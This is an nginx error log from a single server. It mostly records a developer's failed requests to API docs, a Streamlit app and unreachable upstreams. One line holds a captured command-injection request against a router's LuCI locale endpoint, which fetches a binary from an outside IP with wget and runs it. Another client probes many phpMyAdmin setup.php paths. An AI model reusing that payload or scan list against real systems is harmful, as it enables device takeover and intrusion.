2024/08/03 09:28:32 [error] 30#30: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/03 09:28:32 [error] 30#30: *1 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /favicon.ico HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/"
2024/08/03 09:28:42 [error] 30#30: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/03 09:29:06 [error] 30#30: *1 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 09:30:04 [error] 33#33: *9 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 09:30:59 [error] 33#33: *9 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 09:44:12 [error] 29#29: *1 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 09:47:06 [error] 22#22: *1 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 09:50:57 [error] 25#25: *10 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 09:56:41 [error] 29#29: *1 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:07:21 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/ HTTP/1.1", upstream: "http://127.0.0.1:8000/", host: "211.218.17.10"
2024/08/03 10:07:21 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/ HTTP/1.1", upstream: "http://127.0.0.1:8000/", host: "211.218.17.10"
2024/08/03 10:07:22 [error] 29#29: *1 no live upstreams while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/ HTTP/1.1", upstream: "http://service-api/", host: "211.218.17.10"
2024/08/03 10:07:25 [error] 29#29: *1 no live upstreams while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/ HTTP/1.1", upstream: "http://service-api/", host: "211.218.17.10"
2024/08/03 10:07:26 [error] 29#29: *1 no live upstreams while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/ HTTP/1.1", upstream: "http://service-api/", host: "211.218.17.10"
2024/08/03 10:07:31 [error] 29#29: *1 no live upstreams while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/api/docs HTTP/1.1", upstream: "http://service-api/api/docs", host: "211.218.17.10"
2024/08/03 10:07:46 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://127.0.0.1:8000/docs", host: "211.218.17.10"
2024/08/03 10:07:46 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://127.0.0.1:8000/docs", host: "211.218.17.10"
2024/08/03 10:13:46 [error] 31#31: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.163.3:8000/docs", host: "211.218.17.10"
2024/08/03 10:13:47 [error] 30#30: *1 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:13:47 [error] 31#31: *2 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:14:12 [error] 30#30: *1 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:14:42 [error] 30#30: *1 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:18:06 [error] 33#33: *15 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:18:07 [error] 33#33: *15 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:18:07 [error] 33#33: *15 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:22:38 [error] 34#34: *22 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 10:24:52 [error] 31#31: *6 open() "/etc/nginx/html/docs" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /docs HTTP/1.1", host: "211.218.17.10"
2024/08/03 10:26:25 [error] 31#31: *3 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/hello"
2024/08/03 10:26:25 [error] 30#30: *2 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/hello"
2024/08/03 10:28:57 [error] 29#29: *1 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:28:57 [error] 31#31: *2 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:32:17 [error] 30#30: *2 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:32:17 [error] 31#31: *3 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:34:35 [error] 31#31: *3 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 10:34:35 [error] 30#30: *2 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:10:06 [error] 34#34: *23 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:10:42 [error] 35#35: *25 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 154.213.185.140, server: _, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.148%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1", host: "211.218.17.10:80"
2024/08/03 11:11:53 [error] 36#36: *27 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:11:55 [error] 36#36: *27 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:12:13 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /app/_stcore/health HTTP/1.1", upstream: "http://10.10.172.4:8501/_stcore/health", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:12:13 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /app/_stcore/host-config HTTP/1.1", upstream: "http://10.10.172.4:8501/_stcore/host-config", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:12:15 [error] 30#30: *4 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:12:15 [error] 29#29: *1 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:12:16 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.172.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:12:40 [error] 30#30: *4 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:13:32 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.173.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:16:26 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.174.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:17:01 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /app/_stcore/health HTTP/1.1", upstream: "http://10.10.175.4:8501/_stcore/health", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:17:01 [error] 30#30: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /app/_stcore/host-config HTTP/1.1", upstream: "http://10.10.175.4:8501/_stcore/host-config", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:17:03 [error] 30#30: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.175.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:17:04 [error] 29#29: *1 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:17:04 [error] 30#30: *2 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:17:04 [error] 30#30: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.175.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:20:10 [error] 30#30: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.176.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:20:11 [error] 30#30: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.176.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:20:20 [error] 29#29: *2 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:20:48 [error] 29#29: *2 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:23:45 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:46 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:47 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:47 [error] 29#29: *1 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:23:47 [error] 29#29: *2 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/03 11:23:47 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:47 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:47 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:47 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:48 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:48 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:23:48 [error] 29#29: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /api/docs HTTP/1.1", upstream: "http://10.10.177.3:8000/docs", host: "211.218.17.10"
2024/08/03 11:24:03 [error] 29#29: *2 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:25:48 [error] 34#34: *23 open() "/etc/nginx/html/phpMyAdmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:49 [error] 33#33: *24 open() "/etc/nginx/html/phpmyadmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpmyadmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:49 [error] 35#35: *25 open() "/etc/nginx/html/phpMyAdmin-2.11.4/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:49 [error] 36#36: *26 open() "/etc/nginx/html/phpMyAdmin-2.11.3/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:50 [error] 37#37: *27 open() "/etc/nginx/html/phpMyAdmin-2.10.0.2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:50 [error] 38#38: *28 open() "/etc/nginx/html/phpMyAdmin-2.10.3/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:50 [error] 39#39: *29 open() "/etc/nginx/html/phpMyAdmin-2.8.0.2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:53 [error] 40#40: *30 open() "/etc/nginx/html/phpMyAdmin-2.10.2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:53 [error] 41#41: *31 open() "/etc/nginx/html/phpMyAdmin-2.11.9.2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:54 [error] 42#42: *32 open() "/etc/nginx/html/phpMyAdmin-2.11.0/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:54 [error] 43#43: *33 open() "/etc/nginx/html/phpMyAdmin-2.11.7/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:54 [error] 44#44: *34 open() "/etc/nginx/html/phpMyAdmin-2.11.1.2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:55 [error] 45#45: *35 open() "/etc/nginx/html/pma/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/pma/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:55 [error] 46#46: *36 open() "/etc/nginx/html/phpMyAdmin3/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin3/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:56 [error] 47#47: *37 open() "/etc/nginx/html/myadmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/myadmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:56 [error] 48#48: *38 open() "/etc/nginx/html/MyAdmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/MyAdmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:56 [error] 49#49: *39 open() "/etc/nginx/html/PHPMYADMIN/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/PHPMYADMIN/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:56 [error] 50#50: *40 open() "/etc/nginx/html/mysqladmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/mysqladmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:56 [error] 51#51: *41 open() "/etc/nginx/html/SQL/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/SQL/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:56 [error] 52#52: *42 open() "/etc/nginx/html/phpMyAdmin-2.5.5-pl1/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:57 [error] 53#53: *43 open() "/etc/nginx/html/phpMyAdmin-2.5.5/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:57 [error] 54#54: *44 open() "/etc/nginx/html/phpMyAdmin-2.5.4/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:57 [error] 55#55: *45 open() "/etc/nginx/html/phpMyAdmin-2.5.7-pl1/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:58 [error] 56#56: *46 open() "/etc/nginx/html/admin/pma/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/admin/pma/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:58 [error] 57#57: *47 open() "/etc/nginx/html/phpMyAdmin-2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin-2/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:58 [error] 58#58: *48 open() "/etc/nginx/html/web/phpMyAdmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:25:58 [error] 59#59: *49 open() "/etc/nginx/html/webadmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/webadmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:04 [error] 60#60: *50 open() "/etc/nginx/html/dbadmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/dbadmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:08 [error] 61#61: *51 open() "/etc/nginx/html/mysql/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/mysql/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:08 [error] 62#62: *52 open() "/etc/nginx/html/phpMyAdmin2/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpMyAdmin2/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:08 [error] 63#63: *53 open() "/etc/nginx/html/phpma/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpma/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:08 [error] 64#64: *54 open() "/etc/nginx/html/sqlweb/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/sqlweb/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:08 [error] 65#65: *55 open() "/etc/nginx/html/webdb/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/webdb/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:08 [error] 66#66: *56 open() "/etc/nginx/html/websql/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/websql/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:09 [error] 67#67: *57 open() "/etc/nginx/html/_phpMyAdmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/_phpMyAdmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:09 [error] 68#68: *58 open() "/etc/nginx/html/php/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/php/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:09 [error] 29#29: *59 open() "/etc/nginx/html/admin/phpmyadmin/scripts/setup.txt" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/admin/phpmyadmin/scripts/setup.txt HTTP/1.0"
2024/08/03 11:26:09 [error] 29#29: *60 open() "/etc/nginx/html/db/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/db/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:09 [error] 29#29: *61 open() "/etc/nginx/html/sqlmanager/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/sqlmanager/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:10 [error] 29#29: *62 open() "/etc/nginx/html/mysqlmanager/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/mysqlmanager/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:10 [error] 29#29: *63 open() "/etc/nginx/html/phpmanager/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpmanager/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:10 [error] 29#29: *64 open() "/etc/nginx/html/php-myadmin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/php-myadmin/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:10 [error] 29#29: *65 open() "/etc/nginx/html/phpmy-admin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/phpmy-admin/scripts/setup.php HTTP/1.0"
2024/08/03 11:26:10 [error] 29#29: *66 open() "/etc/nginx/html/mysql-admin/scripts/setup.php" failed (2: No such file or directory), client: 1.14.205.166, server: _, request: "GET http://211.218.17.10:80/mysql-admin/scripts/setup.php HTTP/1.0"
2024/08/03 11:28:07 [error] 29#29: *67 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:32:50 [error] 29#29: *69 open() "/etc/nginx/html/v1/auth/login/access-token" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "POST /v1/auth/login/access-token HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/03 11:38:35 [error] 30#30: *2 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/06 04:56:38 [error] 30#30: *2 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.145.104, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/06 04:56:48 [error] 31#31: *3 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.145.104, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:33:19 [emerg] 1#1: host not found in upstream "backend-api:8000" in /etc/nginx/nginx.conf:32
